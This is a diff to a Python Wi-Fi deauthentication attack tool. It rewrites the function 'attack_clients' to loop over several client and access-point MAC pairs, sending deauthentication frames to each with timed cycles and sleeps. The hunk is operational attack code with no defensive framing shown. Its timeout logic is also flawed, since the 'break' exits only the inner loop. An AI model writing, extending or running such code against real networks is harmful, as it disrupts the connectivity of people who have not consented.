@@ -149,22 +149,23 @@ def attack_clients(attack_dict,
 
     for i in range (list_cycles):
         TIME_DIFF = datetime.now() - CURR_TIME
-        if timeout < TIME_DIFF.total_seconds() :
-            print ("terminating timed attack")
-            break
-        else:
-            print("de auth client")
-            de_auth_client(
-                           attack_dict["client_mac"],
-                           attack_dict["ap_mac"],
-                           deauths=de_auths_per_client,
-                           adapter=adapter
-                           )
-            print ("attacked client")
-            print("")
-            if time_between_cycles > 0:
-                print ("sleeping for: " + str(time_between_cycles))
-                time.sleep(time_between_cycles)
+        for pair in attack_dict:
+            if timeout < TIME_DIFF.total_seconds() :
+                print ("terminating timed attack")
+                break
+            else:
+                print("de auth client")
+                de_auth_client(
+                               pair["client_mac"],
+                               pair["ap_mac"],
+                               deauths=de_auths_per_client,
+                               adapter=adapter
+                               )
+                print ("attacked client")
+                print("")
+                if time_between_cycles > 0:
+                    print ("sleeping for: " + str(time_between_cycles))
+                    time.sleep(time_between_cycles)
 
     print ("terminating attack")
 
